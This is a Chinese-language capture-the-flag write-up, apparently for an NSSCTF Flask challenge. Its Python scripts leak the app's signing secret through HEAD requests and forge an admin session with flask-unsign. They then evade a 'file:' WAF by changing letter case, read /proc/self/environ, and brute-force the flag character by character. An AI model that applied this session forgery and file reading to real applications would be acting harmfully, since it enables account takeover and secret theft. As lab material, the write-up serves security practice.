# 思路
	- 用HEAD访问GET路由拿到secret，伪造admin身份拿到源码，用大小写绕过`file:`伪协议WAF,读`File:///proc/self/environ`猜flag内容
	- 预期解貌似是读`/app/flag.py`
- # 拿secret
	- 翻werkzeug代码可以看到对于`GET`的路由，werkzeug的路由会自动为其加上`HEAD`路由支持，所以可以发送HEAD拿到`/getkey`路由的cookie
	- ```python
	  url = "http://node4.anna.nssctf.cn:28931/"
	  # secret = 'bfeeb4f5-f0fa-4c96-9f87-7b1cce74af30'
	  r = requests.head(url + "getkey")
	  print(r.cookies)
	  ```
- # 拿源代码
	- ```python
	  tosign = {
	      "admin": True,
	      "data": [
	          114514,
	      ],
	      "url": "admin",
	  }
	  cmd = f"flask-unsign -s -c {repr(tosign)!r} --secret {secret!r}"
	  print(cmd)
	  out, err = shell.exec(cmd)
	  print(err)
	  print(out)
	  
	  base_request.reset_session()
	  r = base_get(
	      url + "home",
	      cookies={
	          "session": out.strip(),
	      },
	  )
	  print(r.text)
	  print(r.cookies)
	  ```
- # 爆flag
	- ```python
	  known = b'NSSCTF{6a4a1'
	  while True:
	      visited = set()
	      for c in itertools.chain(
	          range(ord("0"), ord("9")),
	          range(ord("a"), ord("f")),
	          "=-{}'\"".encode(),
	          range(0, 128),
	      ):
	          if c in visited:
	              continue
	          visited.add(c)
	          tosign = {
	              "data": known
	              + bytes(
	                  [
	                      c,
	                  ]
	              ),
	              "url": "File:///proc/self/environ",
	          }
	          cmd = f"flask-unsign -s -c {repr(tosign)!r} --secret {secret!r}"
	          out, err = shell.exec(cmd)
	          base_request.reset_session()
	          r = base_get(
	              url + "get_hindd_result",
	              cookies={
	                  "session": out.strip(),
	              },
	          )
	          if "you get it" in r.text:
	              known += bytes(
	                  [
	                      c,
	                  ]
	              )
	              print(known)
	              break
	      else:
	          break
	  print(known)
	  ```